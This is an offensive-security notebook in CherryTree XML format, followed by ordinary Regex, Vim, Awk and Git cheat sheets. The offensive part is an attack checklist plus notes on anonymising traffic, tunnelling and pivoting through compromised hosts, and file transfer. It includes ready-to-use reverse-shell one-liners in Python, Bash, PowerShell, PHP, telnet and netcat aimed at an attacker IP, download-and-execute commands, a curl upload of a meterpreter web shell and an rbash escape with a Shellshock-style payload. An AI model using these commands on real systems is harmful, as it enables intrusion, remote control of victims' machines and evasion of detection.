<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="To-Do" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652377154" ts_lastsave="1655239607">
    <rich_text scale="h2">Recon</rich_text>
    <rich_text>
☐ Determine live hosts
☐ Determine running services
☐ Determine domains
   ☐ Check for subdomains
   ☐ Check for subdirs

</rich_text>
    <rich_text scale="h2">Initial Access</rich_text>
    <rich_text>
☐ Check for public exploits on active services
☐ Check for default credentials
☐ Check for reused credentials
☐ Check for exposed credentials
☐ Check for service misconfigurations
☐ Establish a connection to attacker machine

</rich_text>
    <rich_text scale="h2">Privilege Escalation</rich_text>
    <rich_text>
☐ Determine OS info and kernel info, user info, users, groups and privileges
   ☐ Check PATH and other env vars
   ☐ Writeable files
   ☐ Group writeable files
   ☐ Notes
   ☐ mounted and umnounted drives
   ☐ Capabilities and Tokens
☐ Check user history
☐ Check for locally running services, listening on 127.0.0.1?
☐ Check for scheduled tasks
☐ Check for file misconfigurations
☐ Check for OS misconfigurations
☐ SSH Keys
☐ Passwords</rich_text>
  </node>
  <node name="General Notes" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652286875" ts_lastsave="1652288295">
    <node name="Defense Evasion" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652281254" ts_lastsave="1653407388">
      <rich_text scale="h2">Anonymous Browsing</rich_text>
      <rich_text>
• HTTP Proxy
   ◇ Elite Proxies
      ▪ Appear as a real IP
      ▪ Does not change request fields
   ◇ Anon Proxies
      ▪ Change request fields
      ▪ May be blocked
   ◇ Transparent Proxies
      ▪ NO security, may improve network speed
   ◇ </rich_text>
      <rich_text link="webs https://hidemy.name/en/proxy-list">https://hidemy.name/en/proxy-list</rich_text>
      <rich_text>
   ◇ </rich_text>
      <rich_text link="webs https://hide.me/en/proxy">https://hide.me/en/proxy</rich_text>
      <rich_text>
• Tor
   ◇ </rich_text>
      <rich_text link="webs https://www.torproject.org">https://www.torproject.org</rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Tunneling</rich_text>
      <rich_text>
ssh Local Port Forwarding
   ◇ ssh -L lport:rhost:rport user@domain
      ▪ This will map the port on the local machine to the port on the remote machine
      ▪ You will have to have the attackers pub key in victim authorized_keys
   ◇ ssh -D lport user@domain 
      ▪ /etc/proxychains.conf on local
         - socks5

• ssh Remote Port Forwarding
   ◇ ssh -R rport:lhost:lport user@domain
      ▪  this allows you to relay traffic from port 8080 on the remote server to port 80 on localhost without giving direct access to localhost

• socat
   ◇ socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &amp;

• plink.exe
   ◇ plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080

• meterpreter
   ◇ portfwd add -l lport -p  rport -r rhost
   ◇ portfwd add -l 3306 -p 3306 -r 192.168.1.101

• add route
   ◇ ip route add x.x.x.x/xx via x.x.x.x
   ◇ meterpreter
      ▪ msf exploit(web_delivery) &gt; route add 192.168.0.0 255.255.255.0 1
      ▪ run autoroute -s 192.168.0.1/24</rich_text>
    </node>
    <node name="File Transfers" unique_id="50" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652286908" ts_lastsave="1655264408">
      <rich_text scale="h2">Windows</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Linux</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">System Agnostic</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <codebox char_offset="8" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">certutil.exe -urlcache -f http://x.x.x.x/file.txt file.txt
Invoke-WebRequest “http://x.x.x.x:xxxx/file.ps1” -OutFile “file.ps1”
iex (New-Object Net.Webclient).DownloadString(‘http://x.x.x.x:$port/file.ps1’​)
copy \\x.x.x.x\share\file.exe . #copy from remote smb share</codebox>
      <codebox char_offset="17" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">curl -X PUT http://x.x.x.x/met-shell.txt --data-binary @met-shell.txt
curl -X MOVE -H 'Destination: http://x.x.x.x/met-shell.aspx' http://x.x.x.x/met-shell.txt
wget http://x.x.x.x/file</codebox>
      <codebox char_offset="36" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">#netcat
nc -l -p 1234 &gt; out.file #recieving
nc -w 3 x.x.x.x 1234 &lt; out.file #sending
#python
python2 -m SimpleHTTPServer 80 #web server
python3 -m http.server 80
python -m pyftpdlib -p 21 --write #ftp server
sudo smbserver.py share . -smb2support #smb server
#ssh
scp -r user@x.x.x.x:{file.txt,file.exe} .</codebox>
    </node>
    <node name="Stabilising Shells" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652287451" ts_lastsave="1655268642">
      <rich_text scale="h2">Stabilising Shell</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Escaping rbash</rich_text>
      <rich_text>
1. env
2. echo $PATH
3. echo $SHELL
4. check what's allowed
   ◇ /
      ▪ /bin/sh?
   ◇ Unix commands
      ▪  cp /bin/sh /dir/from/PATH; sh
   ◇ export
      ▪ export PATH=/bin:/usr/bin:$PATH
      ▪ export SHELL=/bin/sh
5. ssh
   ◇ ssh user@x.x.x.x -t “/bin/bash”
   ◇ ssh user@x.x.x.x -t “bash --noprofile”
   ◇ ssh user@x.x.x.x -t “() {:;}; /bin/bash”
6. File writing
   ◇ echo “code” | tee script.sh
   ◇ python -c 'import os; os.system(”/bin/bash")'
   ◇ perl -e ‘exec “/bin/bash”;’</rich_text>
      <codebox char_offset="18" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">SHELL=/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
fg
reset
xterm

## or

python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm; export SHELL=/bin/bash
CTRL+Z
stty raw -echo;fg</codebox>
    </node>
    <node name="Reverse Shells" unique_id="66" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652320389" ts_lastsave="1652890306">
      <rich_text scale="h2">Python</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Bash</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Powershell</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Php</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Telnet</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Netcat</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <codebox char_offset="7" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="python3" highlight_brackets="1" show_line_numbers="1">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.con nect(("&lt;attacker_IP&gt;",&lt;attacker_PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","- i"]);'</codebox>
      <codebox char_offset="15" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">bash -i &gt;&amp; /dev/tcp/&lt;attacker_IP&gt;/&lt;attacker_PORT&gt; 0&gt;&amp;1</codebox>
      <codebox char_offset="29" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('&lt;LHOST&gt;',&lt;PORT&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</codebox>
      <codebox char_offset="36" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="php" highlight_brackets="1" show_line_numbers="1">php -r ‘$sock=fsockopen(“&lt;attacker_IP&gt;”,&lt;attacker_PORT&gt;); exec(“/bin/sh -I &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);'</codebox>
      <codebox char_offset="46" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">telnet &lt;attacker_IP&gt; 4444 | /bin/bash | telnet &lt;attacker_IP&gt; 4445</codebox>
      <codebox char_offset="56" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">nc &lt;attacker_IP&gt; &lt;attacker_PORT&gt; -e /bin/sh
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -I 2&gt;&amp;1 | nc &lt;attacker_IP&gt; &lt;attacker_PORT&gt; &gt; /tmp/f</codebox>
    </node>
    <node name="Routing and Pivoting" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652890306" ts_lastsave="1653441138">
      <rich_text scale="h2">Pivoting</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Routing</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text scale="h2">Socks4</rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <codebox char_offset="9" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">#netsh
##pivot
netsh interface
portproxy add v4to4
listenport=4000
listenaddress=0.0.0.0
connectport=22
connectaddress=target.com
##attacker
ssh user@target.com

#ssh local port forward
##attacker
ssh -fNL 1337:target.com:22 user@pivot.com
##attacker
ssh victim@localhost -P 1337

#ssh remote port forward
##pivot
ssh -fNR 1337:target.com:22 user@attacker.com
##attacker
ssh victim@localhost -P 1337

#proxy
##attacker
ssh user@pivot.com -D 9050 -fN
##attacker
/etc/proxychains.conf
#add pivot.com
proxychains ssh user@victim.com

#sshuttle
##attacker
sshuttle -r user@pivot.com 0.0.0.0/0 #forwards all traffic

#netcat
##pivot
cd /tmp &amp;&amp; mknod backpipe p
##pivot
nc -lvnp 4000 0&lt;backpipe | nc -v target.com 22 1&gt;backpipe
##attacker
ssh user@pivot.com -P 4000

#Meterpreter
##pivot 
portfwd add -l 4000 -p 22 -r target.com
##attacker
ssh user@pivot.com -P 4000

#socat
##pivot
socat TCP-LISTEN:4000,fork TCP:target.com:22
##attacker
ssh user@pivot.com -P 4000

#plink
plink.exe -l &lt;attackerusername&gt; -pw &lt;attackerpassword&gt; -R 445:127.0.0.1:445 &lt;attackerip&gt;
winexe -U victimusername\victimpass //127.0.0.1 "cmd.exe"</codebox>
      <codebox char_offset="20" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">ip route add x.x.x.x/xx via x.x.x.x
#meterpreter
msf exploit(web_delivery) &gt; route add 192.168.0.0 255.255.255.0 1
run autoroute -s 192.168.0.1/24</codebox>
      <codebox char_offset="30" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1"># Pivoting: tunneling all traffic in the internal network 10.10.10.0/24 through Victim 1 in meterpreter session
run autoroute -s 10.10.10.0/24
run autoroute -s 10.10.10.0 -n 255.255.255.0 (or "background" of the meterpreter session: route add 10.10.10.0 255.255.255.0 1) 
#socks4a
msf exploit(java_jre17_exec) &gt; use auxiliary/server/socks4a
msf exploit(java_jre17_exec) &gt; set srvhosts 0.0.0.0
msf exploit(java_jre17_exec) &gt; set srvport 1080
msf exploit(java_jre17_exec) &gt; run
#socks5


#proxychains.conf
socks4		127.0.0.1:9050
socks5		127.0.0.1:1080
socks5		127.0.0.1:1081

proxychains nmap -p$ports -v -iL ips.txt</codebox>
    </node>
    <node name="Cheat Sheets" unique_id="52" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652288295" ts_lastsave="1652288296">
      <node name="Regex" unique_id="53" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652288295" ts_lastsave="1652288295">
        <rich_text scale="h1">Regex Cheat Sheet</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">Basics</rich_text>
        <rich_text>
• *
   ◇ Match preceding character 0 or more times
• +
   ◇ Match preceding character 1 or more times
• .
   ◇ Match any single character
• x|y
   ◇ Match either 'x' or 'y'
• \
   ◇ Escape a special character
• b
   ◇ The character b
• abc
   ◇ The string abc 

</rich_text>
        <rich_text scale="h2">Character Classes</rich_text>
        <rich_text>
• \d
   ◇ Match a digit character
• \D
   ◇ Match a non-digit character
• \s
   ◇ Match a single white space character (space, tab, form feed, or line feed)
• \S
   ◇ Match a single character other than white space
• \w
   ◇ Match any alphanumeric character (including underscore)
• \W
   ◇ Match any non-word character 
• [abc]
   ◇ Match any one of the characters in the set 'abc'
• [^abc]
   ◇ Match anything not in character set 'abc'
• [\b]
   ◇ Match a backspace 

</rich_text>
        <rich_text scale="h2">Assertions</rich_text>
        <rich_text>
• ^
   ◇ Match beginning of input
• $
   ◇ Match end of input
• \b
   ◇ Match a word boundary
• \B
   ◇ Match a non-word boundary
• ?=
   ◇ Lookahead
• ?!
   ◇ Negative lookahead 
• ?&lt;=
   ◇ Lookbehind
• ?&lt;!
   ◇ Negative lookbehind
• ?&gt;
   ◇ Once-only subexpression
• ?()
   ◇ If then condition
• ?()|
   ◇ If then else condition
• ?#
   ◇ Comment 

</rich_text>
        <rich_text scale="h2">Quantifiers</rich_text>
        <rich_text>
• {n}
   ◇ Match exactly n occurrences of preceding character
• {n,m}
   ◇ Match at least n and at most m occurrences of the preceding character
• ?
   ◇ Match 0 or 1 

</rich_text>
        <rich_text scale="h2">Special Characters </rich_text>
        <rich_text>
• \cX
   ◇ Match control character X in a string
• \n
   ◇ Match a line feed
• \r
   ◇ Match a carriage return
• \t
   ◇ Match a tab
• \0
   ◇ Match a NULL 
• \f
   ◇ Match a form feed
• \v
   ◇ Match a vertical tab
• \xhh
   ◇ Match character with code hh (2 hex digits)
• \uhhhh
   ◇ Match character with code hhhh (4 hex digits)

</rich_text>
        <rich_text scale="h2">Flags</rich_text>
        <rich_text>
• g
   ◇ Global search
• i
   ◇ Case-insensitive search
• m
   ◇ Multi-line search
• y
   ◇ "sticky" search match starting at current position in target string 

</rich_text>
        <rich_text scale="h2">Groups</rich_text>
        <rich_text>
• (x)
   ◇ Match 'x' and remember the match
• (?:x)
   ◇ Match 'x' but do not remember the match
• \n
   ◇ A back reference to the last substring matching the n parenthetical in the regex i</rich_text>
      </node>
      <node name="Vim" unique_id="54" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652288295" ts_lastsave="1652288295">
        <rich_text scale="h1">Vim Cheatsheet</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">Text Navigation</rich_text>
        <rich_text>
• k
   ◇ Move up one line
• j
   ◇ Move down one line
• h
   ◇ Move left one character
• l
   ◇ Move right one character
• e
   ◇ Move to end of word
• b
   ◇ Move to beginning of word
• $
   ◇ Move to end of line
• 0
   ◇ Move to beginning of line
• H
   ◇ Move to first line of screen
• M
   ◇ Move to middle line of screen
• L
   ◇ Move to last line of screen
• w
   ◇ Move to next word
• b
   ◇ Move to previous word
• fw
   ◇ Move to next 'w' on line
• Fw
   ◇ Move to previous 'w' on line
• tw
   ◇ Move before next 'w' on line
• Tw
   ◇ Move before previous 'w' on line
• ;
   ◇ Repeat last f, F, t, or T
• ,
   ◇ Repeat last f, F, t, or T reversed
• 5j
   ◇ Move down 5 lines
• 5k
   ◇ Move up 5 lines 
• 5w
   ◇ Move 5 words forward
• 5b
   ◇ Move 5 words backward
• ctrl+e
   ◇ Scroll down
• ctrl+y
   ◇ Scroll up
• gg
   ◇ Go to beginning of file
• G
   ◇ Go to end of file
• 12G
   ◇ Go to line 12
• ctrl+f
   ◇ Move forward one screen
• ctrl+b
   ◇ Move backward one screen
• ^
   ◇ Move to first non whitespace char
• 20|
   ◇ Go to column 20
• %
   ◇ Go to matching parenthesis or bracket
• ctrl+o
   ◇ Move to older position
• ctrl+i
   ◇ Move to newer position
• zt
   ◇ Scroll current line to top of window

</rich_text>
        <rich_text scale="h2">Text Editing</rich_text>
        <rich_text>
• ce
   ◇ Change rest of current word
• dw
   ◇ Delete word
• i
   ◇ Insert
• I
   ◇ Insert at start of line
• a
   ◇ Append
• A
   ◇ Append at end of line
• o
   ◇ Insert new line below
• O
   ◇ Insert new line above
• r
   ◇ Change char and return to cmd mode
• R
   ◇ Enter replace mode
• ESC
   ◇ Exit insert mode to normal mode
• yy
   ◇ Yank (copy) line
• y$
   ◇ Yank (copy) to end of line
• ye
   ◇ Yank (copy) to end of word
• dd
   ◇ Delete (cut) current line
• 5dd
   ◇ Delete 5 lines
• d2w
   ◇ Delete (cut) next two words
• D
   ◇ Delete (cut) to end of line (one char)
• p
   ◇ Paste 
• P
   ◇ Paste before cursor
• u
   ◇ Undo
• U
   ◇ Undo all changes to current line
• ctrl+r
   ◇ Redo
• .
   ◇ Repeat last change
• 5.
   ◇ Repeat last change 5 times
• de
   ◇ Delete (cut) to end of word
• d$
   ◇ Delete (cut) to end of line

</rich_text>
        <rich_text scale="h2">Visual Mode</rich_text>
        <rich_text>
• :w filename↵
   ◇ Write selection to 'filename'
• v
   ◇ Visual mode select characters
• V
   ◇ Visual mode highlight lines
• ~
   ◇ Swap case
• &gt;
   ◇ Shift right
• &lt;
   ◇ Shift left
• c
   ◇ Change highlighted text
• y
   ◇ Yank (copy) highlighted text
• d
   ◇ Cut highlighted text
• =
   ◇ Re-indent selection 

</rich_text>
        <rich_text scale="h2">Window Management</rich_text>
        <rich_text>
• :e filename↵
   ◇ Set current buffer to 'filename'
• :sp↵
   ◇ New window above
• :vs↵
   ◇ New window to left
• :q↵
   ◇ Close current window
• :qa↵
   ◇ Close all windows 

</rich_text>
        <rich_text scale="h2">File Management</rich_text>
        <rich_text>
• :q!↵
   ◇ Quit without saving
• :wq↵
   ◇ Save and exit
• :x↵
   ◇ Save and exit if modified
• :r filename↵
   ◇ Read and insert 'filename'
• :r !cmd↵
   ◇ Execute and insert results of 'cmd'
• :!rm filename↵
   ◇ Delete 'filename'
• :e↵
   ◇ Open new file
• ctrl+g
   ◇ Show file info
• ga
   ◇ Show character info
• :w↵
   ◇ Save changes
• :q↵
   ◇ Quit 

</rich_text>
        <rich_text scale="h2">Bookmarks</rich_text>
        <rich_text>
• :marks↵
   ◇ Show bookmarks
• ma
   ◇ Mark position 'a'
• `a
   ◇ Go to bookmark position 'a'
• ``
   ◇ Go to previous position 

</rich_text>
        <rich_text scale="h2">Replace</rich_text>
        <rich_text>
• :s/foo/bar↵
   ◇ Replace first 'foo' with 'bar' on line
• :s/foo/bar/g↵
   ◇ Replace all 'foo' with 'bar' on line
• :%s/foo/bar/g↵
   ◇ Replace all 'foo' with 'bar' in file
• :%s/foo/bar↵
   ◇ Replace first 'foo' with 'bar' on every line
• :s/foo/bar/gc↵
   ◇ Confirm replace all 'foo' with 'bar' on line
• :s/foo/bar/i↵
   ◇ Ignore case replace first 'foo' with 'bar'
• rx
   ◇ Replace current char with 'x'
• :%s/foo/bar/gc↵
   ◇ Confirm replace all 'foo' with 'bar' in file
• :2,9s/foo/bar/g↵
   ◇ Replace all 'foo' with 'bar' between lines 2 and 9 

</rich_text>
        <rich_text scale="h2">Search</rich_text>
        <rich_text>
• /foo↵
   ◇ Search forwards for 'foo'
• ?foo↵
   ◇ Search backwards for 'foo'
• n
   ◇ Search next
• N
   ◇ Search previous
• *
   ◇ Search for current word forward
• :set nois↵
   ◇ Turn off incremental search
• :set ic↵
   ◇ Set ignore case
• :set is↵
   ◇ Set incremental search
• :set hls↵
   ◇ Set highlight matching phrases 

</rich_text>
        <rich_text scale="h2">Misc</rich_text>
        <rich_text>
• vim -t foo↵
   ◇ Start editing where foo is defined
• :help cmd↵
   ◇ Lookup 'cmd' in help
• :make↵
   ◇ Run make
• :!ls↵
   ◇ Execute 'ls' command
• ctrl+p
   ◇ Move autocomplete backward
• ctrl+x
   ◇ Move language autocomplete forward
• ctrl+o
   ◇ Move language autocomplete backward
• K
   ◇ Look up word in man pages
• yw
   ◇ Yank to beginning of next word 

</rich_text>
        <rich_text scale="h2">&lt;ctrl&gt; p plugin</rich_text>
        <rich_text>
• &lt;ctrl&gt; p                        
   ◇ Open all files and filter
• &lt;ctrl&gt; h, j, k, l               
   ◇ Move to left, Up, Down, Right split
• &lt;ctrl&gt; x                        
   ◇ Open file in vertical split
• &lt;ctrl&gt; v                        
   ◇ Open file in horizontal split
• &lt;ctrl&gt; t                         
   ◇ Open file in new tab

</rich_text>
        <rich_text scale="h2">NERD tree pulugin</rich_text>
        <rich_text>
• &lt;ctrl&gt; b                        
   ◇ NERD Tree
• t                                   
   ◇ Open file in new tab
• ladder (,) n                    
   ◇ Move to left tab
• ladder (,) m                   
   ◇ Move to right tab 
• m                                  
   ◇ Add/ Move/ Delete/ Copy current node



</rich_text>
      </node>
      <node name="Awk" unique_id="55" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652288295" ts_lastsave="1652288295">
        <rich_text scale="h1">Awk Cheat Sheet</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">Basics</rich_text>
        <rich_text>
• $1
   ◇ Reference first column
• awk '/pattern/ {action}' file↵
   ◇ Execute action for matched pattern 'pattern' on file 'file'
• ;
   ◇ Char to separate two actions
• print
   ◇ Print current record line
• $0
   ◇ Reference current record line
• ^
   ◇ Match beginning of field
• ~
   ◇ Match opterator
• !~
   ◇ Do not match operator
• -F
   ◇ Command line option to specify input field delimiter
• BEGIN
   ◇ Denotes block executed once at start
• END
   ◇ Denotes block executed once at end
• str1 str2
   ◇ Concat str1 and str2

</rich_text>
        <rich_text scale="h2">Variables</rich_text>
        <rich_text>
• $2
   ◇ Reference second column
• FS
   ◇ Field separator of input file (default whitespace)
• NF
   ◇ Number of fields in current record
• NR
   ◇ Line number of the current record
• FILENAME
   ◇ Reference current input file
• FNR
   ◇ Reference number of the current record relative to current input file
• OFS
   ◇ Field separator of the outputted data (default whitespace)
• ORS
   ◇ Record separator of the outputted data (default newline)
• RS
   ◇ Record separator of input file (default newline)
• CONVFMT
   ◇ Conversion format used when converting numbers (default %.6g)
• SUBSEP
   ◇ Separates multiple subscripts (default 034)
• OFMT
   ◇ Output format for numbers (default %.6g)
• ARGC
   ◇ Argument count, assignable
• ARGV
   ◇ Argument array, assignable
• ENVIRON
   ◇ Array of environment variables

</rich_text>
        <rich_text scale="h2">Functions</rich_text>
        <rich_text>
• index(s,t)
   ◇ Position in string s where string t occurs, 0 if not found
• length(s)
   ◇ Length of string s (or $0 if no arg)
• rand
   ◇ Random number between 0 and 1
• substr(s,index,len)
   ◇ Return len-char substring of s that begins at index (counted from 1)
• srand
   ◇ Set seed for rand and return previous seed
• int(x)
   ◇ Truncate x to integer value
• split(s,a,fs)
   ◇ Split string s into array a split by fs, returning length of a
• match(s,r)
   ◇ Position in string s where regex r occurs, or 0 if not found
• sub(r,t,s)
   ◇ Substitute t for first occurrence of regex r in string s (or $0 if s not given)
• gsub(r,t,s)
   ◇ Substitute t for all occurrences of regex r in string s
• system(cmd)
   ◇ Execute cmd and return exit status
• tolower(s)
   ◇ String s to lowercase
• toupper(s)
   ◇ String s to uppercase
• getline
   ◇ Set $0 to next input record from current input file.</rich_text>
      </node>
      <node name="Git" unique_id="56" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652288295" ts_lastsave="1652288295">
        <rich_text scale="h1">Git Cheat Sheet</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">Git Basics</rich_text>
        <rich_text>
• git init
   ◇ Initialize a repository
• git status
   ◇ Show status of working tree
• git add file.txt
   ◇ Start tracking file.txt
• git add main.txt
   ◇ Stage modified file main.txt
• git diff
   ◇ Show what's changed but not yet staged
• git commit
   ◇ Commit changes
• git commit -a
   ◇ Stage files and commit
• git mv main.txt file.txt
   ◇ Rename main.txt to file.txt
• git fetch develop
   ◇ Pull data from remote 'develop' without merging
• git pull origin develop
   ◇ Fetch and merge branch 'develop' from origin
• git clone url
   ◇ Create local copy of remote repository at 'url' 

</rich_text>
        <rich_text scale="h2">Branching</rich_text>
        <rich_text>
• git branch
   ◇ Show current branches
• git push origin master
   ◇ Push master branch to origin server
• git branch -v
   ◇ Show last commit on all branches
• git checkout master
   ◇ Switch to branch 'master'
• git branch feature1
   ◇ Create new branch called 'feature1'
• git checkout -b feature2
   ◇ Create branch 'feature2' and switch to it
• git branch -d mybranch
   ◇ Delete branch 'mybranch'
• git branch --merged
   ◇ Show branches already merged into current branch
• git branch --no-merged
   ◇ Show branches not yet merged into current branch
• git branch -D fix
   ◇ Force delete branch 'fix' that is not yet merged
• git push origin feature1
   ◇ Push local branch 'feature1' to origin
• git push staging develop:master
   ◇ Push develop branch to remote staging master
• git checkout -b fix1 origin/fix1
   ◇ Create local branch 'fix1' based off origin branch
• git checkout --track origin/fix2
   ◇ Create tracking branch 'fix2' based off origin
• git push origin :fix2
   ◇ Delete remote branch 'fix2' from origin 

</rich_text>
        <rich_text scale="h2">Merging / Rebasing</rich_text>
        <rich_text>
• git mergetool
   ◇ Use graphical merge tool
• git commit
   ◇ Finalize merge after resolving conflicts
• git merge feature1
   ◇ Merge branch 'feature1' with current branch
• git add file.txt
   ◇ Mark file.txt as resolved after merge
• git rebase develop
   ◇ Rebase changes made on current branch over develop
• git rebase master develop
   ◇ Rebase master onto develop without checking it out
• git rebase --onto master 1a 1b
   ◇ Rebase master onto branch 1b made from branch 1a

</rich_text>
        <rich_text scale="h2">Remotes</rich_text>
        <rich_text>
• git remote
   ◇ Show remote servers you have configured
• git remote -v
   ◇ Show remote servers with URL displayed
• git remote add myurl url
   ◇ Add remote server 'url' with shortname 'myurl'
• git remote rename server1 server2
   ◇ Rename remote 'server1' to 'server2'
• git remote rm server1
   ◇  Remove remote 'server1'
• git remote show origin
   ◇ Show info about remote origin 

</rich_text>
        <rich_text scale="h2">Commit Logs</rich_text>
        <rich_text>
• git log
   ◇ Show commit logs
• git log -p -2
   ◇ Show last two commits with diffs
• git log --stat
   ◇ Show commit logs with stats
• git log --pretty=oneline
   ◇ Show commit logs one per line
• git log --graph
   ◇ Show commit logs with ascii graph
• git log --since=1.week
   ◇ Show commit log for the last week
• git blame -L 10,15 file.rb
   ◇ Show prev commits for each lines 10-15 of file.rb 

</rich_text>
        <rich_text scale="h2">Undo / Change History</rich_text>
        <rich_text>
• git rm --cached main.txt
   ◇ Remove main.txt from staging but keep in working
• git commit --amend
   ◇ Replace last commit with whats in staging
• git checkout -- file.txt
   ◇ Discard changes to file.txt
• git reset HEAD file.txt
   ◇ Unstage file.txt
• git commit --amend
   ◇ Modify last commit message
• git rebase -i HEAD~3
   ◇ Make changes to the last 3 commits 

</rich_text>
        <rich_text scale="h2">Using Tags</rich_text>
        <rich_text>
• git tag
   ◇ Show available tags
• git tag -a v3.0
   ◇ Create annotated tag 'v3.0'
• git show v3.0
   ◇ Show info for tag v3.0
• git tag -s v3.0
   ◇ Create signed tag v3.0
• git tag v2.1-lw
   ◇ Create lightweight tag v2.1
• git tag -v v3.0
   ◇ Verify signed tag v3.0
• git tag -a v2.2 8feb
   ◇ Tag previous commit '8feb' as v2.2
• git push origin v2.2
   ◇ Push tag v2.2 to origin
• git push origin --tags
   ◇ Push all local tags to origin 

</rich_text>
        <rich_text scale="h2">Using Stashes</rich_text>
        <rich_text>
• git stash
   ◇ Stash changes without committing
• git stash list
   ◇ Show stores stashes
• git stash apply
   ◇ Reapply most recent stash
• git stash apply stash@2
   ◇ Reapply stash 2
